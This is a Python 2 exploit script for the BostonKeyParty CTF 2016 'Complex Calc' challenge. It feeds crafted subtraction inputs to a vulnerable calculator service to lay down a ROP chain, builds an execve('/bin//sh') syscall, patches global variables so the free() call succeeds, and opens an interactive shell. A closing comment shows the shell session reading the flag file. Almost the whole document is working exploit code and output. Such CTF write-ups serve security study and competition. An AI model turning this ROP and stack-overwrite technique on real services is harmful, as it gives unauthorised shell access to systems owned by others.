#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# BostonKeyParty CTF 2016 - Complex Calc (Pwn 6pt)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib

# --------------------------------------------------------------------------------------------------
def push_addr( addr ):
    # Write a 4 byte address to the stack (set 4 MSB to 0)
    # Do a subtraction: 2*addr - addr = addr
    return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n' +\
            '2' + '\n' + '1337'      + '\n' + '1337'    + '\n'

# --------------------------------------------------------------------------------------------------
def push_value( addr ):                         # write a 4 byte address to the stack   
    return  '2' + '\n' + str(2*addr) + '\n' + str(addr) + '\n'
    
# --------------------------------------------------------------------------------------------------
def recv_until(st):                             # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(16384)
  return ret
 
# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":

#   s = socket.create_connection(('simplecalc.bostonkey.party', 5400))
    s = socket.create_connection(('localhost', 7777))

    recv_until('Expected number of calculations: ')

    # code is very similar with the simple_calc
    p  = '255' + '\n'                           # allocate a big buffer
    p += push_addr(0x00000000006C4A90)*9        # fill ptr with address of div_1

    # ROP exploit
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1060)          # @ .data
    p += push_addr(0x000000000044db34)          # pop rax ; ret

    p += push_value(0x6e69622f)                 # '/bin'
    p += push_value(0x68732f2f)                 # '//sh'
    
    p += push_addr(0x0000000000470f11)          # mov qword ptr [rsi], rax ; ret
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x000000000041c61f)          # xor rax, rax ; ret
    p += push_addr(0x0000000000470f11)          # mov qword ptr [rsi], rax ; ret
    p += push_addr(0x0000000000401b73)          # pop rdi ; ret
    p += push_addr(0x00000000006c1060)          # @ .data
    p += push_addr(0x0000000000401c87)          # pop rsi ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x0000000000437a85)          # pop rdx ; ret
    p += push_addr(0x00000000006c1068)          # @ .data + 8
    p += push_addr(0x000000000041c61f)          # xor rax, rax ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000463b90)          # add rax, 1 ; ret
    p += push_addr(0x0000000000400488)          # syscall


    # now it's the actuall difference from simple_calc
    # fill add_res and mul_ans with 0x21
    # fix global vars
    p += ('1' + '\n' + str(0xffffff80) + '\n' + str(0xa1)       + '\n')
    p += ('3' + '\n' + str(0x80000001) + '\n' + str(0x80000021) + '\n')
    p += '5' + '\n'                             # exit

    s.send( p )                                 # send payload


    print ' *** Opening Shell *** '
    t = telnetlib.Telnet()                      # try to open shell
    t.sock = s
    t.interact()
    
    exit(0)
# --------------------------------------------------------------------------------------------------
'''
root@nogirl:~/ctf/bostonkeyparty# ./complex_calc_expl.py 
    [..... TRUNCATED FOR BREVITY .....]
    Options Menu: 
     [1] Addition.
     [2] Subtraction.
     [3] Multiplication.
     [4] Division.
     [5] Save and Exit.
    => whoami
        nobody
    ls -la
        total 1188
        drwxr-xr-x 2 root root   4096 Mar  5 03:37 .
        drwxr-xr-x 3 root root   4096 Mar  5 03:20 ..
        -rw-r--r-- 1 root root    220 Mar  5 03:20 .bash_logout
        -rw-r--r-- 1 root root   3637 Mar  5 03:20 .bashrc
        -rw-r--r-- 1 root root    675 Mar  5 03:20 .profile
        -rw-r--r-- 1 root root     24 Mar  5 03:37 key
        -rwxr-xr-x 1 root root     83 Mar  5 03:26 run.sh
        -rwxr-xr-x 1 root root 882266 Mar  5 03:25 simpleCalc_v2
        -rw-r--r-- 1 root root 302348 Mar  5 03:20 socat_1.7.2.3-1_amd64.deb
    cat key
        BKPCTF{th3 l4st 1 2 3z}
    exit
    *** Connection closed by remote host ***
'''
# --------------------------------------------------------------------------------------------------
